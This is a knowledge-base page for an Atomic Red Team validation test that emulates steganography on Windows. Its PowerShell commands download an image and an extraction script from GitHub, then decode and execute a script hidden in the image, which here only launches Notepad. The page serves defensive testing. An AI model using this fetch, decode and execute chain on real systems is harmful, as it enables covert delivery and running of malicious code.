---
atomic_guid: "04bb8e3d-1670-46ab-a3f1-5cee64da29b6"
title: "Embedded Script in Image Execution via Extract-Invoke-PSImage"
framework: "atomic"
generated: "true"
attack_technique_id: "T1001.002"
attack_technique_name: "Data Obfuscation via Steganography"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1001.002/T1001.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "04bb8e3d-1670-46ab-a3f1-5cee64da29b6"
  - "Embedded Script in Image Execution via Extract-Invoke-PSImage"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Embedded Script in Image Execution via Extract-Invoke-PSImage

This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. 
The PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden 
within the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.

The test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden 
PowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a 
separate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.

In the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This
is done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file.

## Metadata

- Atomic GUID: 04bb8e3d-1670-46ab-a3f1-5cee64da29b6
- Technique: T1001.002: Data Obfuscation via Steganography
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1001.002/T1001.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1001-data_obfuscation|T1001.002]]

## Input Arguments

### image_file

- description: Malicious Image file which will be downloaded
- type: path
- default: PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg

### psimage_script

- description: Extract-Invoke-PSImage Script downloaded
- type: path
- default: PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1

## Dependencies

Image file must exist

### Prerequisite Check

```powershell
if (!(Test-Path "#{image_file}")) {exit 1} else {
{exit 0}
}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{image_file}") -ErrorAction Ignore | Out-Null
Write-Output "Downloading image file..."
$imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}
```

Extract-Invoke-PSImage must exist

### Prerequisite Check

```powershell
if (!(Test-Path "#{psimage_script}")) {exit 1} else {
{exit 0}
}
```

### Get Prerequisite

```powershell
New-Item -Path "PathToAtomicsFolder\ExternalPayloads\" -ItemType Directory -Force | Out-Null
Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
$scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
cd "PathToAtomicsFolder\ExternalPayloads\"
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1"
$scriptContent = Get-Content "$HOME\result.ps1" -Raw
$base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content "$HOME\decoded.ps1"
$decodedContent = Get-Content "$HOME\decoded.ps1" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = "$HOME\textExtraction.ps1"
$textMatches -join '' | Set-Content -Path $scriptPath
. "$HOME\textExtraction.ps1"
```

### Cleanup

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore 
Remove-Item -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore
Remove-Item -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1001.002/T1001.002.yaml)
